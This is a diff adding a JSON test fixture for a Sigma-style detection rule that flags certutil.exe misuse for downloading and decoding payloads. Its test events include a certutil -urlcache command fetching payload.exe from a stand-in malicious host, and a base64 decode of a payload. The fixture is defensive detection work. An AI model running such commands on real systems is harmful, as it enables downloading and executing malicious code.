@@ -1,0 +1,42 @@
+{
+  "rule": "sigma/windows/win_suspicious_certutil_download.yml",
+  "description": "certutil.exe -urlcache used to download remote payload (T1140 / T1105)",
+  "match_condition": {
+    "Image":       { "endswith": "\\certutil.exe" },
+    "CommandLine": { "regex": "(?i)(-urlcache|-decode|-decodehex)\\b" }
+  },
+  "test_cases": [
+    {
+      "name": "matches urlcache download",
+      "expected": "match",
+      "event": {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil.exe -urlcache -split -f http://malicious.example/payload.exe out.exe"
+      }
+    },
+    {
+      "name": "matches base64 decode",
+      "expected": "match",
+      "event": {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil -decode payload.b64 payload.exe"
+      }
+    },
+    {
+      "name": "does not match cert listing",
+      "expected": "no_match",
+      "event": {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil.exe -store My"
+      }
+    },
+    {
+      "name": "fp-lookalike: ADCS PKI listing",
+      "expected": "no_match",
+      "event": {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil -view -restrict 'CertificateTemplate=User'"
+      }
+    }
+  ]
+}
